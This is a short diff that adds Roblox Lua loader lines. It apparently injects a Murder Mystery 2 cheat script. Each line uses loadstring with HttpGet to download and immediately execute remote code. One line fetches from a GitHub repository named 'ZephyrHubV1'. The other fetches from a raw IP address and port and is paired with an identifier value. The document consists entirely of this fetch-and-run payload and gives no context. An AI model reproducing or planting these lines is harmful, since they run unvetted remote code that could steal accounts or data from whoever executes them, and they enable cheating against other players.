@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHubV1/MurderMystery2/refs/heads/main/main.lua"))()
+
+ID="0c955622-edba-492d-97d6-fdc4a6479c2e";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
